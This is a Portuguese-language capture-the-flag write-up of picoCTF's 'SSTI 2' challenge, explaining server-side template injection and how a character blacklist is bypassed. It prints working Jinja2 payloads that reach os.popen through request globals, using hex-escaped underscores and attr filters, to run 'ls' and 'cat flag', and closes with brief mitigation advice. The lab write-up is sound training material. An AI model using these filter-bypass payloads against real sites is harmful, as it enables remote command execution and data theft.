# SSTI 2
###### Solved by @Juh-s
>This is a CTF about Web Exploitation and SSTI
## Sobre o desafio

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:56016/)!

Hints: Server Side Template Injection /  Why is blacklisting characters a bad idea to sanitize input?


**Tradução**:

Eu fiz um site legal onde você pode anunciar o que quiser! Eu li sobre a sanitização de entradas, então agora eu removo qualquer tipo de caracteres que podem ser um problema :)

Eu ouvi que o uso de templates é uma maneira legal e modular de construir aplicações web! Confira meu site [aqui](http://shape-facility.picoctf.net:56016/)!

Dicas: Server Side Template Injection / Por que colocar caracteres em uma lista negra é uma má ideia para sanitizar a entrada?

## Solução
**Introdução**

O desafio SSTI2 é parecido com o SSTI1 com um filtro para o payload. Portanto ao acessar o site:

<img width="877" height="213" alt="image" src="https://github.com/user-attachments/assets/dd6e7ceb-0d9f-4fcd-acb3-8283f463b96b" />

Além disso, pela dica passada é possível saber que a solução do desafio será através de [Server Side Template Injection (SSTI)](https://portswigger.net/web-security/server-side-template-injection) e dessa vez, existe um filtro que bloqueia caracteres que podem ser um "problema", possivelmente os caracteres especiais.

Um teste de como o site funciona:

<img width="651" height="193" alt="image" src="https://github.com/user-attachments/assets/7032b3f3-7e7a-454b-9f8c-6d883ddfdab5" />

<img width="746" height="262" alt="image" src="https://github.com/user-attachments/assets/f44b08bb-e19a-436a-9b1b-5b5571e93e10" />

**Análise Inicial**

Partindo para a análise da tabela de vulnerabilidade de SSTI:

<img width="640" height="386" alt="image" src="https://github.com/user-attachments/assets/d9da9aa9-b5b2-4c66-a7d0-745310fde3f7" />

Seguindo passo a passo da tabela, usando o input `${7*7}` primeiro:

<img width="641" height="271" alt="image" src="https://github.com/user-attachments/assets/73432a2b-bc12-4e73-b0b7-857025860f61" />

O site renderiza literalmente `${7*7}`, ou seja, nada é avaliado.

Porém, ao passar para o próximo passo, `{{7*7}}`: 

<img width="492" height="256" alt="image" src="https://github.com/user-attachments/assets/5abcf6ae-82d0-4989-821a-1c563a6e0c49" />

Dessa vez, o site avalia o resultado como `49`.

Com isso, podemos concluir que o [template engine](https://www.treinaweb.com.br/blog/o-que-e-template-engine/) usa a sintaxe de `{{...}}` para avaliação. Ao observar a tabela, o próximo comando para usar é o `{{7*'7'}}`:

<img width="646" height="257" alt="image" src="https://github.com/user-attachments/assets/bc1e11b1-06fa-44b4-89b4-bc1124c35f88" />

O retorno de `7777777` é útil para entendermos que o engine segue uma semântica compatível com Python, isso porque ele sabe tratar tipos distintos e aplicar [operator overloading](https://learn.microsoft.com/pt-br/cpp/cpp/operator-overloading?view=msvc-170) como no Python. Além disso, ele nos mostrar que é possível injetar strings literais no comando `{{...}}` sem que o site as rejeite.

Isso é importante porque:
* Os payloads de SSTI geralmente precisam passar strings.
* O engine usado é provavelmente Jinja2 ou Twig, porém como usamos python, iremos considerar o Jinja2.

Primeiro, iremos verificar se é possível acessar objetos com o `request`:

<img width="938" height="112" alt="image" src="https://github.com/user-attachments/assets/b9045ccc-9671-4df9-b546-94f5c3984861" />

Como esse objeto está disponível no contexto do template, existe uma porta para o ambiente interno do servidor.

Além disso, iremos usar o seguinte payload para acessar o diretório atual e descobrir se o arquivo da flag está nele:

`{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}`

Porém, ao enviar esse payload, o site nos retorna o seguinte:

<img width="808" height="146" alt="Screenshot 2025-09-19 144402" src="https://github.com/user-attachments/assets/971016d4-510e-46a5-979b-c8bb8d80e90f" />

Isso porque, assim como foi dito na dica do desafio, o site está bloqueando o uso dos caracteres especiais. Então para resolver o problema, precisamos contornar essa situação.

Algumas mudanças necessárias são:

* Evitar notações com ponto usando `|attr("...")` no lugar.
* Usar `\x5f` no lugar de `_`.
* Usar `__getitem__` para acessar chaves como `'__builtins__'`.

Montando o payload modificado: `{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")('os')|attr('popen')('ls')|attr('read')()}}`

<img width="642" height="87" alt="image" src="https://github.com/user-attachments/assets/0516c55f-7b9f-43e9-902d-a16c783db652" />

**Solução**

Ao acessar `ls` descobrimos que existe um arquivos chamado `flag` nesse mesmo diretório, e então basta ler esse arquivo para obtermos a flag.

Para solucionar o problema, usamos o mesmo payload modificando apenas o `|attr('popen')('ls')` para `|attr('popen')('cat flag')` que irá ler o arquivo `flag` no sistema do site e retornar o conteúdo:

`{{request|attr('application')|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")('os')|attr('popen')('cat flag')|attr('read')()}}`

<img width="585" height="98" alt="image" src="https://github.com/user-attachments/assets/c0212385-e56c-46cf-92a8-da1300cd9b8d" />

Feito isso, conseguimos obter a flag:

>`picoCTF{sst1_f1lt3r_byp4ss_63b833cd}`

**Aplicação no dia a dia**

Para evitar esse tipo de ataque a essa vulnerabilidade é importante usar sandboxing e remover do contexto do template objetos como `request`.

Isso porque caso o invasor consiga realizar SSTI, ele pode obter dados sensíveis, comprometendo a integridade e a confiabilidade do sistema, afetando a segurança geral da rede e a privacidade dos usuários.
